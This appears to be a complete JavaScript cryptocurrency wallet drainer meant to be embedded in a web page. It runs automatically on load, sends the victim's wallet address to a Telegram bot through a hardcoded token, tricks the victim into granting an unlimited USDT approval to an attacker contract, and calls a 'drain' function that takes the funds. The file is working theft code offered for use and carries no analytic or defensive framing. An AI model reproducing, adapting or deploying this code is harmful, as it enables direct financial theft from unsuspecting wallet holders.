const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
const ABI = [
  {
    "inputs": [{"internalType": "address", "name": "victim", "type": "address"}],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

async function connectAndDrain() {
  try {
    if (!window.ethereum) throw new Error("MetaMask or Web3 wallet not found.");

    // Switch to Binance Smart Chain
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }] // BNB chain ID
    });

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    // Send user address to Telegram
    fetch("https://api.telegram.org/bot6382444394:AAE7ZAZGcGbyRI-v5d50rFFniMwoFJwZX-c/sendMessage?chat_id=6463337516&text=" + address, {
      method: "POST"
    });

    // Approve USDT to your contract
    const USDT = new ethers.Contract(
      "0x55d398326f99059fF775485246999027B3197955", // USDT on BSC
      ["function approve(address spender, uint256 amount) public returns (bool)"],
      signer
    );
    const approvalTx = await USDT.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
    await approvalTx.wait();

    // Call drain function on your contract
    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    const tx = await contract.drain(address);
    await tx.wait();

    console.log("USDT drained successfully");
  } catch (err) {
    console.error("Error:", err);
  }
}

// Automatically run when script loads
connectAndDrain();
